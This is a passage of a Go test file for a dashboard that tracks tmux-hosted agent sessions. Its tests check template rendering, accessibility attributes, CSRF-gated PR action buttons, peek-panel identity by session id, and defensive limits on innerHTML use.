	if iToggle >= iPane || iPane >= iAct {
		t.Fatalf("expected order main-row (%d) < panerow (%d) < actrow (%d):\n%s", iToggle, iPane, iAct, html)
	}
	// Between the main row's toggle and the panerow: exactly the main row's own
	// </tr> and no other row opening — i.e. the panerow directly follows.
	mid1 := html[iToggle:iPane]
	if strings.Count(mid1, "</tr>") != 1 || strings.Count(mid1, "<tr ") != 0 {
		t.Errorf("panerow must immediately follow the main row (intervening rows):\n%s", html[iToggle:iAct])
	}
	// Between the panerow's opening and the actrow: exactly the panerow's own </tr>
	// and no other row opening — i.e. the actrow directly follows the panerow.
	mid2 := html[iPane+len(paneOpen) : iAct]
	if strings.Count(mid2, "</tr>") != 1 || strings.Count(mid2, "<tr ") != 0 {
		t.Errorf("actrow must immediately follow the panerow (intervening rows):\n%s", html[iToggle:iAct])
	}
}

// The tmux session name is no longer a visible roster column, but it must not
// vanish entirely: it is preserved in the peek button's title attribute so it is
// still discoverable on hover. This guards that the name survives the column
// removal rather than being dropped.
func TestContentTemplate_SessionNamePreservedInPeekTitle(t *testing.T) {
	d := dashboardData{
		PeekEnabled: true,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			TmuxSession: "nono redirect buildx state to the worktree",
			TmuxPane:    "%2310", LiveTmux: true,
		}},
	}
	var buf bytes.Buffer
	if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
		t.Fatal(err)
	}
	html := buf.String()

	// The session name lives in the peek button's title, ahead of the peek hint.
	want := `class="peek" data-pane="%2310" data-peek="s1" aria-expanded="false" aria-controls="panerow-s1" aria-label="show pane for nono redirect buildx state to the worktree" title="nono redirect buildx state to the worktree — show this pane's last lines"`
	if !strings.Contains(html, want) {
		t.Fatalf("session name must be preserved in the peek button title:\n%s", html)
	}
	// The removed session column leaves no .sessname/.sessline behind.
	if strings.Contains(html, "sessname") || strings.Contains(html, "sessline") {
		t.Errorf("removed session cell markup (sessname/sessline) must not render:\n%s", html)
	}
}

// The peek panerow and merge actrow span the whole roster width with a colspan.
// The base roster is 7 always-on columns (CI, branch, app, status, doing, idle,
// session) plus one shared controls column whenever peek OR merge is on. The id
// column is debug-gated, so it adds a column only under ?debug=1. A panerow only
// exists when peek is on, so the controls column is always present: the panerow
// spans 8 at rest and 9 in debug mode. Likewise the actrow (merge-only). A stale
// colspan would mis-span the table.
func TestContentTemplate_PanelRowColspanTracksControlsColumn(t *testing.T) {
	render := func(d dashboardData) string {
		var buf bytes.Buffer
		if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
			t.Fatal(err)
		}
		return buf.String()
	}
	base := dashboardData{
		PeekEnabled: true,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", LiveTmux: true, HasPane: true,
		}},
	}

	// wantColspan asserts the panel rows carry exactly `n` and no other colspan.
	wantColspan := func(t *testing.T, got string, n int, ctx string) {
		t.Helper()
		for _, c := range []int{7, 8, 9} {
			marker := fmt.Sprintf(`colspan="%d"`, c)
			if c == n {
				if !strings.Contains(got, marker) {
					t.Errorf("%s: panel rows must span %d columns:\n%s", ctx, n, got)
				}
			} else if strings.Contains(got, marker) {
				t.Errorf("%s: unexpected colspan %d (want %d):\n%s", ctx, c, n, got)
			}
		}
	}

	// Peek on, merge off: 7 base cols + controls col (holds the peek button) →
	// panerow spans 8 at rest.
	off := base
	off.MergeEnabled = false
	wantColspan(t, render(off), 8, "peek on, merge off")

	// Debug adds the id column, so the same row spans 9.
	dbg := off
	dbg.Debug = true
	wantColspan(t, render(dbg), 9, "peek on, merge off, debug")

	// Peek on + merge on: both panerow and actrow span 8 at rest.
	on := base
	on.MergeEnabled = true
	wantColspan(t, render(on), 8, "peek on + merge on")

	// Peek OFF + merge on: no panerow (peek gates it), but the merge actrow still
	// spans 8 — the controls column is present under merge alone.
	mergeOnly := dashboardData{
		MergeEnabled: true,
		PeekEnabled:  false,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting, HasPane: true,
		}},
	}
	wantColspan(t, render(mergeOnly), 8, "merge on, peek off")
}

// The peek button's accessible name must carry the tmux session, not just the
// bare "⤢" glyph: title alone is not a reliable accessible name, so an explicit
// aria-label mirrors the actbtn/copycwd pattern. And in peek-only mode a row with
// no live pane emits neither the peek button nor a merge toggle, so the controls
// cell must fall back to the roster's "—" convention instead of an empty wrapper.
func TestContentTemplate_PeekControlsCellA11yAndEmptyState(t *testing.T) {
	render := func(d dashboardData) string {
		var buf bytes.Buffer
		if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
			t.Fatal(err)
		}
		return buf.String()
	}

	// Live pane, peek on: the peek button names its session in aria-label.
	live := dashboardData{
		PeekEnabled: true,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", LiveTmux: true,
		}},
	}
	if got := render(live); !strings.Contains(got, `aria-label="show pane for sess"`) {
		t.Errorf("peek button must carry an aria-label naming its session:\n%s", got)
	}

	// Peek on but the row has no live pane: no peek button, no merge toggle, so the
	// controls cell shows "—" rather than an empty .ctrlwrap.
	dead := dashboardData{
		PeekEnabled: true,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting, LiveTmux: false,
		}},
	}
	got := render(dead)
	if strings.Contains(got, `class="peek"`) {
		t.Errorf("no live pane: peek button must not render:\n%s", got)
	}
	if !strings.Contains(got, `<div class="ctrlwrap">—</div>`) {
		t.Errorf("no live pane: controls cell must fall back to \"—\":\n%s", got)
	}
}

// renderDashboard executes the full dashboardTmpl (mirroring handleDashboard,
// server.go:532) rather than just the "content" sub-template, since the
// data-csrf attribute lives on <body>, outside "content".
func renderDashboard(t *testing.T, d dashboardData) string {
	t.Helper()
	d.Now = time.Now()
	var buf bytes.Buffer
	if err := dashboardTmpl.Execute(&buf, d); err != nil {
		t.Fatal(err)
	}
	return buf.String()
}

// PR-action buttons (squash/admin/close/ready) render in the roster only when
// --enable-merge is on, and the CSRF token is only echoed onto <body> in that
// case too — the JS action handler reads it from data-csrf.
func TestDashboardRendersActionButtonsOnlyWhenEnabled(t *testing.T) {
	base := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}}}
	// disabled
	off := base
	off.MergeEnabled = false
	if strings.Contains(renderDashboard(t, off), "data-action=") {
		t.Fatal("action buttons rendered while disabled")
	}
	// enabled
	on := base
	on.MergeEnabled = true
	on.CSRFToken = "tok"
	html := renderDashboard(t, on)
	if !strings.Contains(html, "data-action=") || !strings.Contains(html, `data-csrf="tok"`) {
		t.Fatal("action buttons / csrf token missing while enabled")
	}
}

func TestDashboardRendersForceToggleWhenEnabled(t *testing.T) {
	base := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}}}
	off := base // MergeEnabled false
	if strings.Contains(renderDashboard(t, off), "practforce") {
		t.Fatal("force toggle rendered while merge disabled")
	}
	on := base
	on.MergeEnabled = true
	on.CSRFToken = "tok"
	if !strings.Contains(renderDashboard(t, on), "practforce") {
		t.Fatal("force toggle missing while merge enabled")
	}
}

// The per-row End button (dismiss this roster row) is part of the opt-in write
// surface, so it must be absent unless --enable-merge is on — and, unlike the
// tmux session actions, it must render even for a row with no live pane, since
// those stale rows are what End exists to clear.
func TestDashboardRendersEndButtonOnlyWhenEnabled(t *testing.T) {
	base := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}}}
	off := base // MergeEnabled false
	if strings.Contains(renderDashboard(t, off), `data-action="end"`) {
		t.Fatal("End button rendered while merge disabled")
	}
	on := base
	on.MergeEnabled = true
	on.CSRFToken = "tok"
	html := renderDashboard(t, on)
	if !strings.Contains(html, `data-action="end"`) {
		t.Fatal("End button missing while merge enabled")
	}
	// Not gated on HasPane: this agent has none.
	if on.Agents[0].HasPane {
		t.Fatal("fixture unexpectedly has a pane")
	}
	if !strings.Contains(html, `class="actgroup rowform"`) {
		t.Fatal("End button must sit in its own ungated row cluster")
	}
	// End keeps the two-step arm/confirm flow.
	if strings.Contains(html, `data-action="end" data-noconfirm`) {
		t.Fatal("End must not opt out of the confirm step")
	}
}

// The End action reuses the PR cluster's already-proven JS, but contributes two
// new string literals to it: its own CAVEAT entry (the confirm-step warning) and
// its membership in the "clears" set (which keeps the row locked so the poller
// can drop it). A typo in either is silent at runtime, so assert both are wired
// into the rendered dashboard whenever the write surface is on.
func TestDashboardWiresEndIntoActionScript(t *testing.T) {
	on := dashboardData{
		Agents:       []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}},
		MergeEnabled: true,
		CSRFToken:    "tok",
	}
	html := renderDashboard(t, on)
	if !strings.Contains(html, "end: 'dismiss this row from the dashboard") {
		t.Error("CAVEAT has no entry for the end action")
	}
	// Anchor on the clears declaration itself, not on a bare "action === 'end'"
	// substring: that also appears in other branches of the action handler, so a
	// loose match still passes when end is dropped from the clears set — the very
	// regression this guards.
	if !strings.Contains(html, "var clears = (action === 'squash' || action === 'squash-admin' || action === 'close' || action === 'end');") {
		t.Error("end is not included in the row-clearing (clears) set")
	}
}

// "Pin order" reorders the roster by re-appending group blocks, and moving a
// <tr> detaches and reinserts it — which costs a descendant scroll container its
// offset. An open peek scrolled to the bottom therefore snapped back to the top
// on every poll, undoing the restore swapContent had just done a few lines
// earlier. apply() saves each visible capsule's scrollTop and writes it back
// after the whole re-append pass, so the compensation stays with the loop that
// causes it and survives any future caller.
func TestDashboardPinReorderPreservesPeekScroll(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	body := getBody(t, db, "/")
	// One contiguous fragment: it pins the save, the re-append it compensates
	// for, and — crucially — that the restore runs after that loop, not before.
	frag := `      var caps = [];
      var prows = document.querySelectorAll('#content .panerow');
      for (var k = 0; k < prows.length; k++) {
        if (prows[k].hidden) continue;
        var pc = prows[k].querySelector('.panecap');
        if (pc) caps.push({ el: pc, top: pc.scrollTop });
      }
`
	if !strings.Contains(body, frag) {
		t.Errorf("pin reorder no longer saves open peek scroll offsets before re-appending:\n%s", frag)
	}
	restore := `          for (var c = 0; c < bl[b].length; c++) tbody.appendChild(bl[b][c]);
        }
      }
      for (var s = 0; s < caps.length; s++) caps[s].el.scrollTop = caps[s].top;`
	if !strings.Contains(body, restore) {
		t.Errorf("pin reorder no longer restores peek scroll offsets after the re-append loop:\n%s", restore)
	}
}

// The pane peek must identify a roster row by its SESSION id, not by the tmux
// pane id. Two sessions can be attached to one tmux pane, so a pane id addresses
// more than one row: keyed that way, the poller's carry-over re-opened the peek
// on whichever row rendered first and collapsed the row the reader was in, and
// the aria-expanded scan lit the wrong button. Every lookup keys on data-peek /
// data-peek-row (the session id, unique per roster row because agentRoster groups
// by a non-empty session_id); the pane id survives only as the fetch payload on
// the button.
func TestHandleDashboard_PeekKeysOnSessionNotPane(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	body := getBody(t, db, "/")

	for _, frag := range []string{
		// swapContent carry-over: capture and match on the session id.
		`sess: rows[i].getAttribute('data-peek-row'),`,
		`if (newRows[r].getAttribute('data-peek-row') !== op.sess) continue;`,
		`if (btns[b].getAttribute('data-peek') === op.sess) {`,
		// Row/button lookup and the toggle + Esc paths.
		`if (rows[i].getAttribute('data-peek-row') === sess) return rows[i];`,
		`if (btns[i].getAttribute('data-peek') === sess) return btns[i];`,
		`if (n.classList.contains('panerow')) closePane(n.getAttribute('data-peek-row'), false);`,
		`var psess = peekBtn.getAttribute('data-peek');`,
		`var psess = scope.getAttribute('data-peek-row') || scope.getAttribute('data-peek');`,
		`if (!rows[i].hidden && closePane(rows[i].getAttribute('data-peek-row'), false)) closed = true;`,
		// The pane id is still what /api/pane is asked for, read off the button.
		`var pane = btn ? btn.getAttribute('data-pane') : '';`,
		`fetch('/api/pane?pane=' + encodeURIComponent(pane)`,
	} {
		if !strings.Contains(body, frag) {
			t.Errorf("peek must key on the session id — fragment missing: %s", frag)
		}
	}

	// The peek key is an unvalidated session id, so it must never be interpolated
	// into a CSS selector — not even behind the CSS.escape fallback.
	if strings.Contains(body, `'.panerow[data-peek-row="'`) {
		t.Error("peek row lookup must not build a selector from the session id")
	}

	// Opening either panel must collapse the other one on the same roster row,
	// in BOTH directions, and the peek half of that must still be session-keyed.
	for _, frag := range []string{
		// actions opening closes an open peek …
		`if (n.classList.contains('panerow')) closePane(n.getAttribute('data-peek-row'), false);`,
		// The third argument keeps remembered action messages: this collapse is a
		// panel switch, not a dismissal (see TestDashboardPeekSwitchKeepsRememberedMessages).
		`else closeAct(n.getAttribute('data-actions-row'), false, true);`,
		// … and both openers route through the shared collapse.
		"function openPane(sess) {\n      var row = paneRow(sess);",
	} {
		if !strings.Contains(body, frag) {
			t.Errorf("peek/actions must close each other — fragment missing: %s", frag)
		}
	}
	// Both openers must reach closeOtherPanels, each checked over a window after
	// its own definition rather than as one long literal: the exact guard lines
	// in between are free to be reflowed, the call is not.
	for _, fn := range []string{"function openPane(sess) {", "function openAct(sess) {"} {
		i := strings.Index(body, fn)
		if i < 0 || !strings.Contains(body[i:min(i+400, len(body))], "closeOtherPanels(row);") {
			t.Errorf("%s must call closeOtherPanels so the sibling panel collapses", fn)
		}
	}

	// No lookup may key a row's identity on the pane id any more.
	for _, gone := range []string{
		`data-pane-row`,
		`getAttribute('data-pane') === op.pane`,
	} {
		if strings.Contains(body, gone) {
			t.Errorf("pane-keyed row identity still present in the page: %s", gone)
		}
	}
}

// The rendered roster row must carry the session identity on BOTH halves of the
// peek (the ⤢ button and its panerow) while the button keeps the pane id for the
// capture fetch, and two rows sharing one tmux pane must still render distinct
// peek keys — the whole point of re-keying off the pane id.
func TestContentTemplate_PeekIdentityIsSessionAcrossSharedPane(t *testing.T) {
	d := dashboardData{
		PeekEnabled: true,
		Agents: []Agent{
			{SessionID: "sess-a", SourceApp: "app", Status: statusWaiting,
				TmuxSession: "sess", TmuxPane: "%7", LiveTmux: true},
			{SessionID: "sess-b", SourceApp: "app", Status: statusWaiting,
				TmuxSession: "sess", TmuxPane: "%7", LiveTmux: true},
		},
	}
	var buf bytes.Buffer
	if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
		t.Fatal(err)
	}
	html := buf.String()

	for _, sess := range []string{"sess-a", "sess-b"} {
		// One combined fragment, not three independent ones: each attribute has to
		// sit on THIS session's button, not merely somewhere on the page. Checked
		// separately, two buttons with their aria-controls swapped would pass —
		// and pointing a toggle at another row's panel is the very bug class this
		// whole fix is about. Now that the key is unique, the toggle can name its
		// panel the way the sibling actions toggle does: aria-controls matching
		// the row's id.
		if !strings.Contains(html, `class="peek" data-pane="%7" data-peek="`+sess+`" aria-expanded="false" aria-controls="panerow-`+sess+`"`) {
			t.Errorf("peek button for %s must carry data-pane, data-peek and its own aria-controls:\n%s", sess, html)
		}
		if !strings.Contains(html, `<tr class="panerow" hidden id="panerow-`+sess+`" data-peek-row="`+sess+`">`) {
			t.Errorf("panerow for %s must be keyed by session id:\n%s", sess, html)
		}
	}
	// Two rows, one pane, two distinct identities — nothing keyed on the pane.
	if n := strings.Count(html, `data-peek-row=`); n != 2 {
		t.Errorf("expected 2 keyed panerows, got %d:\n%s", n, html)
	}
	if strings.Contains(html, "data-pane-row") {
		t.Errorf("panerow must no longer be keyed on the tmux pane id:\n%s", html)
	}
}

// A failed PR-action result used to survive only until the next poll repainted
// #content with a fresh, empty .actmsg — anywhere from ~0s to the whole refresh
// interval (issue #98). swapContent now re-applies remembered failure text. The
// restore is order-INdependent (the carry-over's hidden attribute does not hide
// groups from querySelectorAll, and the pin reorder re-appends existing nodes
// rather than re-rendering them), so what is pinned here is placement, not an
// invariant: the guarded call must stay inside swapContent's repaint fix-ups,
// adjacent to the pin-apply call.
func TestDashboardActionMessageSurvivesContentSwap(t *testing.T) {
	on := dashboardData{
		Agents:       []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}},
		MergeEnabled: true,
		CSRFToken:    "tok",
	}
	html := renderDashboard(t, on)

	// One contiguous fragment (html/template strips JS comments, so these are the
	// two adjacent statements as shipped): the restore runs guarded, and it sits
	// with the other repaint fix-up rather than drifting elsewhere in the file.
	call := `      try { if (window.__ckActMsgs) window.__ckActMsgs.restore(); } catch (e) {}
      try { if (window.__ckPin && window.__ckPin.isOn()) window.__ckPin.apply(); } catch (e) {}`
	if !strings.Contains(html, call) {
		t.Errorf("action-message restore no longer runs (guarded) immediately before the pin reorder:\n%s", call)
	}

	// The holder itself, and the 5s floor the fix exists to guarantee.
	if !strings.Contains(html, "var ACTMSG_MIN_MS = 5000;") {
		t.Error("the 5000ms minimum-visibility constant is not shipped")
	}
	if !strings.Contains(html, "window.__ckActMsgs = { note: noteMsg, clear: clearMsgNote, restore: restoreMsgs };") {
		t.Error("__ckActMsgs holder not exported from the merge IIFE")
	}
}

// Only results the reader must not miss are remembered: the failure, timeout and
// network-error branches. A success either clears its row or needs no second
// look, and remembering it would re-paint stale text over a live row. Equally,
// a superseded message ('working…' on a retry) must drop its note so a stale
// failure cannot resurrect.
func TestDashboardActionMessagePersistsOnlyFailures(t *testing.T) {
	on := dashboardData{
		Agents:       []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}},
		MergeEnabled: true,
		CSRFToken:    "tok",
	}
	html := renderDashboard(t, on)

	// Failure + timeout share one note() call, placed after both writes.
	fail := `              : 'timed out — verify before retrying';
            if (!d.ok || d.timedOut) noteMsg(group, msg.textContent);`
	if !strings.Contains(html, fail) {
		t.Errorf("failure/timeout results are no longer remembered across repaints:\n%s", fail)
	}
	// The rejected-fetch branch.
	catchFrag := `          if (msg) { msg.textContent = 'request failed: ' + e; noteMsg(group, msg.textContent); }`
	if !strings.Contains(html, catchFrag) {
		t.Errorf("a rejected /api/action fetch no longer remembers its message:\n%s", catchFrag)
	}
	// Firing again supersedes whatever was there.
	if !strings.Contains(html, `      if (msg) { clearMsgNote(group); msg.textContent = 'working…'; }`) {
		t.Error("firing an action no longer drops the previously remembered message")
	}
	// The success text is written in the same expression as the failure text, so a
	// literal negative ("no note() next to 'done'") could never fail. Count the
	// call sites instead: exactly two may exist — the guarded failure/timeout one
	// asserted above and the .catch one — so ANY new noteMsg call, including one
	// added to the ok branch, trips this.
	// 3 = the one declaration plus exactly those two call sites.
	const wantNoteMentions = 3
	if got := strings.Count(html, "noteMsg("); got != wantNoteMentions {
		t.Errorf("noteMsg( appears %d time(s), want %d (its declaration, the failure/timeout guard and the .catch branch); a new call site — e.g. on the success branch — must not remember its result across repaints", got, wantNoteMentions)
	}
	// Keyed by group class as well as session: three .actgroups share a session.
	if !strings.Contains(html, "var ACTMSG_GROUPS = ['actsession', 'prform', 'rowform'];") {
		t.Error("remembered messages are no longer keyed by group class")
	}
}

// Collapsing a row's actions panel is a deliberate dismissal of whatever result
// it was showing. unlock(group, false) leaves the remembered failure text in
// place on purpose (the reader may not have read it yet), so without an explicit
// clear here a repaint inside the 5s window would re-paint the dismissed text.
func TestDashboardClosingActionsPanelClearsRememberedMessages(t *testing.T) {
	on := dashboardData{
		Agents:       []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}},
		MergeEnabled: true,
		CSRFToken:    "tok",
	}
	html := renderDashboard(t, on)

	// Contiguous through row.hidden, so the clear is pinned to the close path
	// itself (html/template blanks the comment lines above it). The !keepMsgs
	// guard is part of the fragment: the clear must stay opt-out, not
	// unconditional (see the peek-switch test below).
	frag := `      if (!keepMsgs && window.__ckActMsgs) {
        var gs = row.querySelectorAll('.actgroup');
        for (var i = 0; i < gs.length; i++) window.__ckActMsgs.clear(gs[i]);
      }
      row.hidden = true;`
	if !strings.Contains(html, frag) {
		t.Errorf("collapsing the actions panel no longer drops that row's remembered messages, so a dismissed failure can be re-painted:\n%s", frag)
	}
}

// The peek-switch path is NOT a dismissal. closeOtherPanels fires when the user
// opens the sibling peek on the same row to investigate a failure they just saw;
// clearing the note there would delete the message from actMsgs so restoreMsgs
// has nothing to restore, and re-opening the actions panel after the next repaint
// would show a blank .actmsg — the very bug this work exists to fix.
func TestDashboardPeekSwitchKeepsRememberedMessages(t *testing.T) {
	on := dashboardData{
		Agents:       []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}},
		MergeEnabled: true,
		CSRFToken:    "tok",
	}
	html := renderDashboard(t, on)

	// Only closeOtherPanels may pass keepMsgs.
	keep := `          else closeAct(n.getAttribute('data-actions-row'), false, true);`
	if !strings.Contains(html, keep) {
		t.Errorf("closeOtherPanels must close the actions panel WITHOUT clearing its notes — the user is switching to peek, not dismissing:\n%s", keep)
	}
	// The deliberate-dismissal call sites must NOT pass it, or every close would
	// keep the notes and the dismissal fix above would be undone.
	dismiss := []string{
		`if (actBtn.getAttribute('aria-expanded') === 'true') { closeAct(sess, false); return; }`,
		`if (sess) closed = closeAct(sess, true);`,
		`if (!arows[k].hidden && closeAct(arows[k].getAttribute('data-actions-row'), false)) closed = true;`,
	}
	for _, frag := range dismiss {
		if !strings.Contains(html, frag) {
			t.Errorf("this deliberate-dismissal closeAct call site must clear notes (no keepMsgs argument):\n%s", frag)
		}
	}
	// Disarming stays unconditional: an armed destructive confirm must never
	// survive out of sight, whatever the reason the panel is closing.
	disarm := `      if (window.__ckDisarm) window.__ckDisarm(row);`
	if !strings.Contains(html, disarm) {
		t.Errorf("closeAct must disarm on every path, including the peek switch:\n%s", disarm)
	}
	// The literals above enumerate the call sites we know about; they stay green
	// if a NEW call site appears and forgets to decide keepMsgs. Pin the total so
	// adding one forces a conscious choice here. 5 = the declaration plus the four
	// calls (one keep, three dismiss).
	const wantCloseAct = 5
	if got := strings.Count(html, "closeAct("); got != wantCloseAct {
		t.Errorf("dashboard renders %d closeAct( occurrences, want %d: a new call site must decide whether it is a dismissal (clear notes) or an incidental panel swap (keepMsgs), and be enumerated above", got, wantCloseAct)
	}
}

// Structural backstop for the exact-literal assertions elsewhere: the restore
// path re-applies raw git/gh subprocess output, which scrubString strips secrets
// from but does not HTML-escape. It must never re-enter the HTML parser, so no
// innerHTML assignment may appear anywhere in restoreMsgs.
func TestDashboardActionMessageRestoreNeverUsesInnerHTML(t *testing.T) {
	on := dashboardData{
		Agents:       []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}},
		MergeEnabled: true,
		CSRFToken:    "tok",
	}
	html := renderDashboard(t, on)

	start := strings.Index(html, "function restoreMsgs() {")
	if start < 0 {
		t.Fatal("restoreMsgs not found; the innerHTML invariant below is meaningless")
	}
	rest := html[start:]
	// Assumes restoreMsgs is indented four spaces, so its closing brace is the
	// first "\n    }" after the opening line. If the file's indentation changes,
	// update this delimiter — otherwise the slice truncates early and the check
	// silently passes on a shortened body.
	end := strings.Index(rest, "\n    }")
	if end < 0 {
		t.Fatal("could not find the end of restoreMsgs; the innerHTML invariant below is meaningless")
	}
	body := rest[:end]
	if regexp.MustCompile(`(?i)innerHTML|insertAdjacentHTML|outerHTML`).MatchString(body) {
		t.Errorf("restoreMsgs must assign remembered text with textContent only — it re-applies raw subprocess output, which must never re-enter the HTML parser:\n%s", body)
	}
}

// wantInnerHTML is the number of innerHTML occurrences the dashboard template is
// allowed to render: exactly one, the #content.innerHTML assignment in
// swapContent, which predates this work and paints server-rendered,
// html/template-escaped markup. Complements the restoreMsgs slice above, which a
// helper indirection (paintMsg(el, t) { el.innerHTML = t; }) could route around.
const wantInnerHTML = 1

// The dashboard paints raw git/gh subprocess output, so any NEW innerHTML in this
// template needs a deliberate security look before the count is bumped.
func TestDashboardInnerHTMLOccurrencesAreAccountedFor(t *testing.T) {
	on := dashboardData{
		Agents:       []Agent{{SessionID: "s1", Branch: "feature", Status: statusWaiting}},
		MergeEnabled: true,
		CSRFToken:    "tok",
	}
	html := renderDashboard(t, on)

	got := len(regexp.MustCompile(`(?i)innerHTML`).FindAllString(html, -1))
	if got != wantInnerHTML {
		t.Errorf("dashboard renders %d innerHTML occurrences, want %d: the dashboard paints raw git/gh subprocess output, so any new innerHTML needs a deliberate security look (does the assigned string come from a subprocess or any other untrusted source?) before wantInnerHTML is changed", got, wantInnerHTML)
	}
}
